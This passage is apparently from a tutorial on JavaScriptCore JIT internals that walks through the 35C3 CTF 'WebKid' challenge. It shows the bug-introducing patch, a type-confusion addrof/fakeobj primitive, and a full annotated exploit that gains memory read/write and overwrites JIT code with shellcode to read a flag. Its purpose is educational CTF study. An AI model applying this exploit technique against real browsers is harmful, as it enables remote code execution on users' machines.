class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a>GetLocal<span class="op">(</span>Untyped<span class="op">:</span><span class="er">@</span><span class="dv">1</span><span class="op">,</span> arg1<span class="op">(</span>B<span class="op">&lt;</span>Int32<span class="op">&gt;/</span>FlushedInt32<span class="op">),</span> R<span class="op">:</span>Stack<span class="op">(</span><span class="dv">6</span><span class="op">),</span> bc<span class="er">#7);</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a>GetLocal<span class="op">(</span>Untyped<span class="op">:</span><span class="er">@</span><span class="dv">2</span><span class="op">,</span> arg2<span class="op">(</span>C<span class="op">&lt;</span>BoolInt32<span class="op">&gt;/</span>FlushedInt32<span class="op">),</span> R<span class="op">:</span>Stack<span class="op">(</span><span class="dv">7</span><span class="op">),</span> bc<span class="er">#7);</span></span>
<span id="cb38-3"><a href="#cb38-3" aria-hidden="true" tabindex="-1"></a>ArithAdd<span class="op">(</span>Int32<span class="op">:</span><span class="er">@</span><span class="dv">23</span><span class="op">,</span> Int32<span class="op">:</span><span class="er">@</span><span class="dv">24</span><span class="op">,</span> CheckOverflow<span class="op">,</span> Exits<span class="op">,</span> bc<span class="er">#7);</span></span>
<span id="cb38-4"><a href="#cb38-4" aria-hidden="true" tabindex="-1"></a>MovHint<span class="op">(</span>Untyped<span class="op">:</span><span class="er">@</span><span class="dv">25</span><span class="op">,</span> loc6<span class="op">,</span> W<span class="op">:</span>SideState<span class="op">,</span> ClobbersExit<span class="op">,</span> bc<span class="er">#7, ExitInvalid);</span></span>
<span id="cb38-5"><a href="#cb38-5" aria-hidden="true" tabindex="-1"></a>Return<span class="op">(</span>Untyped<span class="op">:</span><span class="er">@</span><span class="dv">25</span><span class="op">,</span> W<span class="op">:</span>SideState<span class="op">,</span> Exits<span class="op">,</span> bc<span class="er">#12);</span></span></code></pre></div>
<p>The AST looks like this:</p>
<pre class="example"><code>   +----------+
   |  return  |
   +----+-----+
        |
        |
   +----+-----+
   |   add    |
   +----------+
   |          |
   |          |
   v          v
+--+---+    +-+----+
| arg1 |    | arg2 |
+------+    +------+
</code></pre>
<h3 id="x2.-dfg">0x2. DFG</h3>
<p>If JSC detects a function running a few times. It will go to the next
phase. The first phase has already generated byte code. So, <strong>DFG
parser</strong> parses byte code directly, which it's less abstract and
easier to parse. Then, DFG will optimize and generate code:</p>
<pre class="example"><code>DFG bytecode parser -&gt; DFG optimizer 
-&gt; DFG Backend
</code></pre>
<p>In this step, the code runs many times; and they type is relatively
constant. Type check will use <strong>OSR</strong>.</p>
<p>Imagine we will optimize from this:</p>
<div class="sourceCode" id="cb41"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> foo<span class="op">(</span><span class="dt">int</span><span class="op">*</span> ptr<span class="op">)</span></span>
<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> w<span class="op">,</span> x<span class="op">,</span> y<span class="op">,</span> z<span class="op">;</span></span>
<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a>w <span class="op">=</span> <span class="op">...</span> <span class="co">// lots of stuff</span></span>
<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a>x <span class="op">=</span> is_ok<span class="op">(</span>ptr<span class="op">)</span> <span class="op">?</span> <span class="op">*</span>ptr <span class="op">:</span> slow_path<span class="op">(</span>ptr<span class="op">);</span></span>
<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a>y <span class="op">=</span> <span class="op">...</span> <span class="co">// lots of stuff</span></span>
<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a>z <span class="op">=</span> is_ok<span class="op">(</span>ptr<span class="op">)</span> <span class="op">?</span> <span class="op">*</span>ptr <span class="op">:</span> slow_path<span class="op">(</span>ptr<span class="op">);</span> <span class="cf">return</span> w <span class="op">+</span> x <span class="op">+</span> y <span class="op">+</span> z<span class="op">;</span></span>
<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>to this:</p>
<div class="sourceCode" id="cb42"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> foo<span class="op">(</span><span class="dt">int</span><span class="op">*</span> ptr<span class="op">)</span></span>
<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> w<span class="op">,</span> x<span class="op">,</span> y<span class="op">,</span> z<span class="op">;</span></span>
<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a>w <span class="op">=</span> <span class="op">...</span> <span class="co">// lots of stuff</span></span>
<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(!</span>is_ok<span class="op">(</span>ptr<span class="op">))</span></span>
<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> foo_base1<span class="op">(</span>ptr<span class="op">,</span> w<span class="op">);</span></span>
<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a>x <span class="op">=</span> <span class="op">*</span>ptr<span class="op">;</span></span>
<span id="cb42-9"><a href="#cb42-9" aria-hidden="true" tabindex="-1"></a>y <span class="op">=</span> <span class="op">...</span> <span class="co">// lots of stuff</span></span>
<span id="cb42-10"><a href="#cb42-10" aria-hidden="true" tabindex="-1"></a>z <span class="op">=</span> <span class="op">*</span>ptr<span class="op">;</span></span>
<span id="cb42-11"><a href="#cb42-11" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> w <span class="op">+</span> x <span class="op">+</span> y <span class="op">+</span> z<span class="op">;</span></span>
<span id="cb42-12"><a href="#cb42-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>The code will run faster because <code class="verbatim">ptr</code>
will only do type check once. If the type of <em>ptr</em> is always
different, the optimized code runs slower because of frequent bailing
out. Thus, only when the code runs thousands of times, the browser uses
<code class="verbatim">OSR</code> to optimize it.</p>
<h3 id="x3.-flt">0x3. FLT</h3>
<p>A function, if, runs a hundred or thousands of time, the JIT will use
<strong>FLT</strong> . Like <strong>DFG</strong>, <strong>FLT</strong>
will reuse the <strong>byte code template</strong>, but with a deeper
optimization:</p>
<pre class="example"><code>DFG bytecode parser -&gt; DFG optimizer
-&gt; DFG-to-B3 lowering -&gt; B3 Optimizer -&gt;
Instruction Selection -&gt; Air Optimizer -&gt;
Air Backend
</code></pre>
<h3 id="x4.-more-about-optimization">0x4. More About Optimization</h3>
<p>Let's have a look on change of IR in different optimizing phases:</p>
<table>
<thead>
<tr class="header">
<th>IR</th>
<th>Style</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Bytecode</td>
<td>High Level Load/Store</td>
<td><code class="verbatim">bitor dst, left, right</code></td>
</tr>
<tr class="even">
<td>DFG</td>
<td>Medium Level Exotic SSA</td>
<td><code
class="verbatim">dst: BitOr(Int32:@left, Int32:@right, ...)</code></td>
</tr>
<tr class="odd">
<td>B3</td>
<td>Low Level Normal SSA</td>
<td><code class="verbatim">Int32 @dst = BitOr(@left, @right)</code></td>
</tr>
<tr class="even">
<td>Air</td>
<td>Architectural CISC</td>
<td><code class="verbatim">Or32 %src, %dest</code></td>
</tr>
</tbody>
</table>
<p>Type check is gradually eliminated. You may understand why there are
so many type confusions in browser CVE now. In addition, they are more
and more similar to machine code.</p>
<p>Once the type check fails, the code will return to previous IR
(e.g. a type check fails in <strong>B3</strong> stage, the compiler will
return to <strong>DFG</strong> and execute in this stage).</p>
<h2 id="garbage-collector-todo">Garbage Collector (TODO)</h2>
<p>The heap of JSC is based on GC. The objects in heap will have a
counter about their references. GC will scan the heap to collect the
useless memory.</p>
<p>…still, need more materials…</p>
<hr />
<h1 id="writing-exploitation">Writing Exploitation</h1>
<p>Before we start exploiting bugs, we should look at how difficult it
is to write an exploit. We focus on exploit code writing here, the
detail of the vulnerability will not be introduced much.</p>
<p>This challenge is <strong>WebKid</strong> from 35c3 CTF. You can
compile WebKit binary(with instructions), prepared VM, and get exploit
code <a
href="https://github.com/saelo/35c3ctf/tree/master/WebKid">here</a>.
Also, a macOS Mojave (10.14.2) should be prepared in VM or real machine
(I think it won't affect crashes in different versions of macOS, but the
attack primitive might be different).</p>
<p>Run via this command:</p>
<pre class="shell"><code>DYLD_LIBRARY_PATH=/Path/to/WebKid DYLD_FRAMEWORK_PATH=/Path/to/WebKid /Path/to/WebKid/MiniBrowser.app/Contents/MacOS/MiniBrowser
</code></pre>
<blockquote>
<p>Remember to use <strong>FULL PATH</strong>. Otherwise, the browser
will crash</p>
</blockquote>
<p>If running on a local machine, remember to create <code
class="verbatim">/flag1</code> for testing.</p>
<h2 id="analyzing">Analyzing</h2>
<p>Let's look at the patch:</p>
<pre class="example"><code>diff --git a/Source/JavaScriptCore/runtime/JSObject.cpp b/Source/JavaScriptCore/runtime/JSObject.cpp
index 20fcd4032ce..a75e4ef47ba 100644
--- a/Source/JavaScriptCore/runtime/JSObject.cpp
+++ b/Source/JavaScriptCore/runtime/JSObject.cpp
@@ -1920,6 +1920,31 @@ bool JSObject::hasPropertyGeneric(ExecState* exec, unsigned propertyName, Proper
     return const_cast&lt;JSObject*&gt;(this)-&gt;getPropertySlot(exec, propertyName, slot);
 }

+static bool tryDeletePropertyQuickly(VM&amp; vm, JSObject* thisObject, Structure* structure, PropertyName propertyName, unsigned attributes, PropertyOffset offset)
+{
+    ASSERT(isInlineOffset(offset) || isOutOfLineOffset(offset));
+
+    Structure* previous = structure-&gt;previousID();
+    if (!previous)
+        return false;
+
+    unsigned unused;
+    bool isLastAddedProperty = !isValidOffset(previous-&gt;get(vm, propertyName, unused));
+    if (!isLastAddedProperty)
+        return false;
+
+    RELEASE_ASSERT(Structure::addPropertyTransition(vm, previous, propertyName, attributes, offset) == structure);
+
+    if (offset == firstOutOfLineOffset &amp;&amp; !structure-&gt;hasIndexingHeader(thisObject)) {
+        ASSERT(!previous-&gt;hasIndexingHeader(thisObject) &amp;&amp; structure-&gt;outOfLineCapacity() &gt; 0 &amp;&amp; previous-&gt;outOfLineCapacity() == 0);
+        thisObject-&gt;setButterfly(vm, nullptr);
+    }
+
+    thisObject-&gt;setStructure(vm, previous);
+
+    return true;
+}
+
 // ECMA 8.6.2.5
 bool JSObject::deleteProperty(JSCell* cell, ExecState* exec, PropertyName propertyName)
 {
@@ -1946,18 +1971,21 @@ bool JSObject::deleteProperty(JSCell* cell, ExecState* exec, PropertyName proper

     Structure* structure = thisObject-&gt;structure(vm);

-    bool propertyIsPresent = isValidOffset(structure-&gt;get(vm, propertyName, attributes));
+    PropertyOffset offset = structure-&gt;get(vm, propertyName, attributes);
+    bool propertyIsPresent = isValidOffset(offset);
     if (propertyIsPresent) {
         if (attributes &amp; PropertyAttribute::DontDelete &amp;&amp; vm.deletePropertyMode() != VM::DeletePropertyMode::IgnoreConfigurable)
             return false;

-        PropertyOffset offset;
-        if (structure-&gt;isUncacheableDictionary())
+        if (structure-&gt;isUncacheableDictionary()) {
             offset = structure-&gt;removePropertyWithoutTransition(vm, propertyName, [] (const ConcurrentJSLocker&amp;, PropertyOffset) { });
-        else
-            thisObject-&gt;setStructure(vm, Structure::removePropertyTransition(vm, structure, propertyName, offset));
+        } else {
+            if (!tryDeletePropertyQuickly(vm, thisObject, structure, propertyName, attributes, offset)) {
+                thisObject-&gt;setStructure(vm, Structure::removePropertyTransition(vm, structure, propertyName, offset));
+            }
+        }

-        if (offset != invalidOffset)
+        if (offset != invalidOffset &amp;&amp; (!isOutOfLineOffset(offset) || thisObject-&gt;butterfly()))
             thisObject-&gt;locationForOffset(offset)-&gt;clear();
     }

diff --git a/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in b/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in
index 536481ecd6a..62189fea227 100644
--- a/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in
+++ b/Source/WebKit/WebProcess/com.apple.WebProcess.sb.in
@@ -25,6 +25,12 @@
 (deny default (with partial-symbolication))
 (allow system-audit file-read-metadata)

+(allow file-read* (literal &quot;/flag1&quot;))
+
+(allow mach-lookup (global-name &quot;net.saelo.shelld&quot;))
+(allow mach-lookup (global-name &quot;net.saelo.capsd&quot;))
+(allow mach-lookup (global-name &quot;net.saelo.capsd.xpc&quot;))
+
 #if PLATFORM(MAC) &amp;&amp; __MAC_OS_X_VERSION_MIN_REQUIRED &lt; 101300
 (import &quot;system.sb&quot;)
 #else
</code></pre>
<p>The biggest problem here is about <code
class="verbatim">tryDeletePropertyQuickly</code> function, which acted
like this (comment provided from <em>Linus Henze</em>:</p>
<div class="sourceCode" id="cb46"><pre
class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="at">static</span> <span class="dt">bool</span> tryDeletePropertyQuickly<span class="op">(</span>VM<span class="op">&amp;</span> vm<span class="op">,</span> JSObject<span class="op">*</span> thisObject<span class="op">,</span> Structure<span class="op">*</span> structure<span class="op">,</span> PropertyName propertyName<span class="op">,</span> <span class="dt">unsigned</span> attributes<span class="op">,</span> PropertyOffset offset<span class="op">)</span></span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb46-3"><a href="#cb46-3" aria-hidden="true" tabindex="-1"></a>   <span class="co">// This assert will always be true as long as we&#39;re not passing an &quot;invalid&quot; offset</span></span>
<span id="cb46-4"><a href="#cb46-4" aria-hidden="true" tabindex="-1"></a>   ASSERT<span class="op">(</span>isInlineOffset<span class="op">(</span>offset<span class="op">)</span> <span class="op">||</span> isOutOfLineOffset<span class="op">(</span>offset<span class="op">));</span></span>
<span id="cb46-5"><a href="#cb46-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-6"><a href="#cb46-6" aria-hidden="true" tabindex="-1"></a>   <span class="co">// Try to get the previous structure of this object</span></span>
<span id="cb46-7"><a href="#cb46-7" aria-hidden="true" tabindex="-1"></a>   Structure<span class="op">*</span> previous <span class="op">=</span> structure<span class="op">-&gt;</span>previousID<span class="op">();</span></span>
<span id="cb46-8"><a href="#cb46-8" aria-hidden="true" tabindex="-1"></a>   <span class="cf">if</span> <span class="op">(!</span>previous<span class="op">)</span></span>
<span id="cb46-9"><a href="#cb46-9" aria-hidden="true" tabindex="-1"></a>       <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span> <span class="co">// If it has none, stop here</span></span>
<span id="cb46-10"><a href="#cb46-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-11"><a href="#cb46-11" aria-hidden="true" tabindex="-1"></a>   <span class="dt">unsigned</span> unused<span class="op">;</span></span>
<span id="cb46-12"><a href="#cb46-12" aria-hidden="true" tabindex="-1"></a>   <span class="co">// Check if the property we&#39;re deleting is the last one we added</span></span>
<span id="cb46-13"><a href="#cb46-13" aria-hidden="true" tabindex="-1"></a>   <span class="co">// This must be the case if the old structure doesn&#39;t have this property</span></span>
<span id="cb46-14"><a href="#cb46-14" aria-hidden="true" tabindex="-1"></a>   <span class="dt">bool</span> isLastAddedProperty <span class="op">=</span> <span class="op">!</span>isValidOffset<span class="op">(</span>previous<span class="op">-&gt;</span>get<span class="op">(</span>vm<span class="op">,</span> propertyName<span class="op">,</span> unused<span class="op">));</span></span>
<span id="cb46-15"><a href="#cb46-15" aria-hidden="true" tabindex="-1"></a>   <span class="cf">if</span> <span class="op">(!</span>isLastAddedProperty<span class="op">)</span></span>
<span id="cb46-16"><a href="#cb46-16" aria-hidden="true" tabindex="-1"></a>       <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span> <span class="co">// Not the last property? Stop here and remove it using the normal way.</span></span>
<span id="cb46-17"><a href="#cb46-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-18"><a href="#cb46-18" aria-hidden="true" tabindex="-1"></a>   <span class="co">// Assert that adding the property to the last structure would result in getting the current structure</span></span>
<span id="cb46-19"><a href="#cb46-19" aria-hidden="true" tabindex="-1"></a>   RELEASE_ASSERT<span class="op">(</span>Structure<span class="op">::</span>addPropertyTransition<span class="op">(</span>vm<span class="op">,</span> previous<span class="op">,</span> propertyName<span class="op">,</span> attributes<span class="op">,</span> offset<span class="op">)</span> <span class="op">==</span> structure<span class="op">);</span></span>
<span id="cb46-20"><a href="#cb46-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-21"><a href="#cb46-21" aria-hidden="true" tabindex="-1"></a>   <span class="co">// Uninteresting. Basically, this just deletes this objects Butterfly if it&#39;s not an array and we&#39;re asked to delete the last out-of-line property. The Butterfly then becomes useless because no property is stored in it, so we can delete it.</span></span>
<span id="cb46-22"><a href="#cb46-22" aria-hidden="true" tabindex="-1"></a>   <span class="cf">if</span> <span class="op">(</span>offset <span class="op">==</span> firstOutOfLineOffset <span class="op">&amp;&amp;</span> <span class="op">!</span>structure<span class="op">-&gt;</span>hasIndexingHeader<span class="op">(</span>thisObject<span class="op">))</span> <span class="op">{</span></span>
<span id="cb46-23"><a href="#cb46-23" aria-hidden="true" tabindex="-1"></a>       ASSERT<span class="op">(!</span>previous<span class="op">-&gt;</span>hasIndexingHeader<span class="op">(</span>thisObject<span class="op">)</span> <span class="op">&amp;&amp;</span> structure<span class="op">-&gt;</span>outOfLineCapacity<span class="op">()</span> <span class="op">&gt;</span> <span class="dv">0</span> <span class="op">&amp;&amp;</span> previous<span class="op">-&gt;</span>outOfLineCapacity<span class="op">()</span> <span class="op">==</span> <span class="dv">0</span><span class="op">);</span></span>
<span id="cb46-24"><a href="#cb46-24" aria-hidden="true" tabindex="-1"></a>       thisObject<span class="op">-&gt;</span>setButterfly<span class="op">(</span>vm<span class="op">,</span> <span class="kw">nullptr</span><span class="op">);</span></span>
<span id="cb46-25"><a href="#cb46-25" aria-hidden="true" tabindex="-1"></a>   <span class="op">}</span></span>
<span id="cb46-26"><a href="#cb46-26" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-27"><a href="#cb46-27" aria-hidden="true" tabindex="-1"></a>   <span class="co">// Directly set the structure of this object</span></span>
<span id="cb46-28"><a href="#cb46-28" aria-hidden="true" tabindex="-1"></a>   thisObject<span class="op">-&gt;</span>setStructure<span class="op">(</span>vm<span class="op">,</span> previous<span class="op">);</span></span>
<span id="cb46-29"><a href="#cb46-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb46-30"><a href="#cb46-30" aria-hidden="true" tabindex="-1"></a>   <span class="cf">return</span> <span class="kw">true</span><span class="op">;</span></span>
<span id="cb46-31"><a href="#cb46-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>In short, one object will fall back to previous structure ID by
deleting an object added previously. For example:</p>
<pre class="example"><code>var o = [1.1, 2.2, 3.3, 4.4];
// o is now an object with structure ID 122.
o.property = 42;
// o is now an object with structure ID 123. The structure is a leaf (has never transitioned)

function helper() {
     return o[0];
}
jitCompile(helper); // Running helper function many times
// In this case, the JIT compiler will choose to use a watchpoint instead of runtime checks
// when compiling the helper function. As such, it watches structure 123 for transitions.

delete o.property;
// o now &quot;went back&quot; to structure ID 122. The watchpoint was not fired.
</code></pre>
<p>Let's review some knowledge first. In JSC, we have <strong>runtime
type checks</strong> and <strong>watchpoint</strong> to ensure correct
type conversion. After a function running many times, the JSC will not
use structure check. Instead, it will replace it with
<strong>watchpoint</strong>. When an object is modified, the browser
should trigger watchpoint to notify this change to fallback to JS
interpreter and generate new JIT code.</p>
<p>Here, restoring to the previous ID does will not trigger <code
class="verbatim">watchpoint</code> even though the structure has
changed, which means the structure of <strong>butterfly pointer</strong>
will also be changed. However, the JIT code generated by <code
class="verbatim">helper</code> will not fallback since
<strong>watchpoint</strong> is not trigged, leading to type confusion.
And the JIT code can still access legacy <strong>butterfly</strong>
structure. We can leak/create fake objects.</p>
<p>This is the minimum attack primitive:</p>
<pre class="example"><code>haxxArray = [13.37, 73.31];
haxxArray.newProperty = 1337;

function returnElem() {
    return haxxArray[0];
}

function setElem(obj) {
    haxxArray[0] = obj;
}

for (var i = 0; i &lt; 100000; i++) {
    returnElem();
    setElem(13.37);
}

delete haxxArray.newProperty;
haxxArray[0] = {};

function addrof(obj) {
    haxxArray[0] = obj;
    return returnElem();
}

function fakeobj(address) {
    setElem(address);
    return haxxArray[0];
}
// JIT code treat it as intereger, but it actually should be an object. 
// We can leak address from it
print(addrof({})); 
// Almost the same as above, but it&#39;s for write data
print(fakeobj(addrof({})));
</code></pre>
<h2 id="utility-functions">Utility Functions</h2>
<p>The exploit script creates many utility functions. They help us to
create primitive which you need in almost every webkit exploit. We will
only look at some important functions.</p>
<h3 id="getting-native-code">Getting Native Code</h3>
<p>To attack, we need a native code function to write shellcode or ROP.
Besides, functions will only be a native code after running many
times(this one is in <code class="verbatim">pwn.js</code>):</p>
<pre class="example"><code>function jitCompile(f, ...args) {
    for (var i = 0; i &lt; ITERATIONS; i++) {
        f(...args);
    }
}

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i &lt; num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}
</code></pre>
<h3 id="controlling-bytes">Controlling Bytes</h3>
<p>In the <code class="verbatim">int64.js</code>, we craft a class <code
class="verbatim">Int64</code>. It uses <code
class="verbatim">Uint8Array</code> to store number and creates many
related operations like <code class="verbatim">add</code> and <code
class="verbatim">sub</code>. In the previous chapter, we mention that
JavaScript uses <strong>tagged value</strong> to represent the number,
which means that you cannot control the higher byte. The <code
class="verbatim">Uint8Array</code> array represents 8-bit unsigned
integers just like native value, allowing us to control all 8 bytes.</p>
<p>Simple example usage of <code class="verbatim">Uint8Array</code>:</p>
<pre class="example"><code>var x = new Uint8Array([17, -45.3]);
var y = new Uint8Array(x);
console.log(x[0]); 
// 17

console.log(x[1]); // value will be converted 8 bit unsigned integers
// 211 
</code></pre>
<p>It can be merged to a 16 byte array. The following shows us that
<code class="verbatim">Uint8Array</code> store in native form clearly,
because <code class="verbatim">0x0201</code> == <code
class="verbatim">513</code>:</p>
<pre class="example"><code>a = new Uint8Array([1,2,3,4])
b = new  Uint16Array(a.buffer) 
// Uint16Array [513, 1027]
</code></pre>
<p>Remaining functions of <code class="verbatim">Int64</code> are
simulations of different operations. You can infer their implementations
from their names and comments. Reading the codes is easy too.</p>
<h2 id="writing-exploit">Writing Exploit</h2>
<h3 id="detail-about-the-script">Detail about the Script</h3>
<p>I add some comments from Saelo's original writeup(most comments are
still his work, great thanks!):</p>
<pre class="example"><code>const ITERATIONS = 100000;

// A helper function returns function with native code
function jitCompile(f, ...args) {
    for (var i = 0; i &lt; ITERATIONS; i++) {
        f(...args);
    }
}
jitCompile(function dummy() { return 42; });

// Return a function with native code, we will palce shellcode in this function later
function makeJITCompiledFunction() {

    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i &lt; num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    jitCompile(target, 123);

    return target;
}

function setup_addrof() {
    var o = [1.1, 2.2, 3.3, 4.4];
    o.addrof_property = 42;

    // JIT compiler will install a watchpoint to discard the
    // compiled code if the structure of |o| ever transitions
    // (a heuristic for |o| being modified). As such, there
    // won&#39;t be runtime checks in the generated code.
    function helper() {
        return o[0];
    }
    jitCompile(helper);

    // This will take the newly added fast-path, changing the structure
    // of |o| without the JIT code being deoptimized (because the structure
    // of |o| didn&#39;t transition, |o| went &quot;back&quot; to an existing structure).
    delete o.addrof_property;

    // Now we are free to modify the structure of |o| any way we like,
    // the JIT compiler won&#39;t notice (it&#39;s watching a now unrelated structure).
    o[0] = {};

    return function(obj) {
        o[0] = obj;
        return Int64.fromDouble(helper());
    };
}

function setup_fakeobj() {
    var o = [1.1, 2.2, 3.3, 4.4];
    o.fakeobj_property = 42;

    // Same as above, but write instead of reading from the array.
    function helper(addr) {
        o[0] = addr;
    }
    jitCompile(helper, 13.37);

    delete o.fakeobj_property;
    o[0] = {};

    return function(addr) {
        helper(addr.asDouble());
        return o[0];
    };
}

function pwn() {
    var addrof = setup_addrof();
    var fakeobj = setup_fakeobj();

    // verify basic exploit primitives work.
    var addr = addrof({p: 0x1337});
    assert(fakeobj(addr).p == 0x1337, &quot;addrof and/or fakeobj does not work&quot;);
    print(&#39;[+] exploit primitives working&#39;);


    // from saelo: spray structures to be able to predict their IDs.
    // var structs = []
    // var i = 0;
    // var abc = [13.37];
    // abc.pointer = 1234;
    // abc[&#39;prop&#39; + i] = 13.37;
    // structs.push(abc);
    // var victim = structs[0];
    //
    // and the payload still work stablely. It seems this action is redundant
    var structs = []
    for (var i = 0; i &lt; 0x1000; ++i) {
        var array = [13.37];
        array.pointer = 1234;
        array[&#39;prop&#39; + i] = 13.37;
        structs.push(array);
    }

    // take an array from somewhere in the middle so it is preceeded by non-null bytes which
    // will later be treated as the butterfly length.
    var victim = structs[0x800];
    print(`[+] victim @ ${addrof(victim)}`);

    // craft a fake object to modify victim
    var flags_double_array = new Int64(&quot;0x0108200700001000&quot;).asJSValue();
    var container = {
        header: flags_double_array,
        butterfly: victim
    };

    // create object having |victim| as butterfly.
    var containerAddr = addrof(container);
    print(`[+] container @ ${containerAddr}`);
    // add the offset to let compiler recognize fake structure
    var hax = fakeobj(Add(containerAddr, 0x10));
    // origButterfly is now based on the offset of **victim** 
    // because it becomes the new butterfly pointer
    // and hax[1] === victim.pointer
    var origButterfly = hax[1];

    var memory = {
        addrof: addrof,
        fakeobj: fakeobj,

        // Write an int64 to the given address.
        writeInt64(addr, int64) {
            hax[1] = Add(addr, 0x10).asDouble();
            victim.pointer = int64.asJSValue();
        },

        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
        write16(addr, value) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, 0x10).asDouble();
            victim.pointer = value;
        },

        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
        write(addr, data) {
            while (data.length % 4 != 0)
                data.push(0);

            var bytes = new Uint8Array(data);
            var ints = new Uint16Array(bytes.buffer);

            for (var i = 0; i &lt; ints.length; i++)
                this.write16(Add(addr, 2 * i), ints[i]);
        },

        // Read a 64 bit value. Only works for bit patterns that don&#39;t represent NaN.
        read64(addr) {
            // Set butterfly of victim object and dereference.
            hax[1] = Add(addr, 0x10).asDouble();
            return this.addrof(victim.pointer);
        },

        // Verify that memory read and write primitives work.
        test() {
            var v = {};
            var obj = {p: v};

            var addr = this.addrof(obj);
            assert(this.fakeobj(addr).p == v, &quot;addrof and/or fakeobj does not work&quot;);

            var propertyAddr = Add(addr, 0x10);

            var value = this.read64(propertyAddr);
            assert(value.asDouble() == addrof(v).asDouble(), &quot;read64 does not work&quot;);

            this.write16(propertyAddr, 0x1337);
            assert(obj.p == 0x1337, &quot;write16 does not work&quot;);
        },
    };

    // Testing code, not related to exploit
    var plainObj = {};
    var header = memory.read64(addrof(plainObj));
    memory.writeInt64(memory.addrof(container), header);
    memory.test();
    print(&quot;[+] limited memory read/write working&quot;);

    // get targetd function
    var func = makeJITCompiledFunction();
    var funcAddr = memory.addrof(func);

    // change the JIT code to shellcode
    // offset addjustment is a little bit complicated here :P
    print(`[+] shellcode function object @ ${funcAddr}`);
    var executableAddr = memory.read64(Add(funcAddr, 24));
    print(`[+] executable instance @ ${executableAddr}`);
    var jitCodeObjAddr = memory.read64(Add(executableAddr, 24));
    print(`[+] JITCode instance @ ${jitCodeObjAddr}`);
    // var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 368));      // offset for debug builds
    // final JIT Code address
    var jitCodeAddr = memory.read64(Add(jitCodeObjAddr, 352));
    print(`[+] JITCode @ ${jitCodeAddr}`);

    var s = &quot;A&quot;.repeat(64);
    var strAddr = addrof(s);
    var strData = Add(memory.read64(Add(strAddr, 16)), 20);
    shellcode.push(...strData.bytes());

    // write shellcode
    memory.write(jitCodeAddr, shellcode);

    // trigger shellcode
    var res = func();

    var flag = s.split(&#39;\n&#39;)[0];
    if (typeof(alert) !== &#39;undefined&#39;)
        alert(flag);
    print(flag);
}

if (typeof(window) === &#39;undefined&#39;)
    pwn();
</code></pre>
<h2 id="conclusion-on-the-exploitation">Conclusion on the
Exploitation</h2>
<p>To conclude, the exploit uses two most important attack primitive -
<code class="verbatim">addrof</code> and <code
class="verbatim">fakeobj</code> - to leak and craft. A JITed function is
leaked and overwritten with our <code class="verbatim">shellcode</code>
array. Then we called the function to leak flag. Almost all the browser
exploits follow this form.</p>
<p>Thanks, 35C3 CTF organizers especially Saelo. It's a great challenge
to learn WebKit type confusion.</p>
<hr />
<h1 id="debugging-webkit">Debugging WebKit</h1>
<p>Now, we have understood all the theories: architecture, object model,
exploitation. Let's start some real operations. To prepare, use compiled
<em>JSC</em> from <strong>Setup</strong> part. Just use the latest
version since we only discuss debugging here.</p>
<p>I used to try to set breakpoints to find their addresses, but this is
actually very stupid. <em>JSC</em> has many non-standard functions which
can dump information for us (you cannot use most of them in
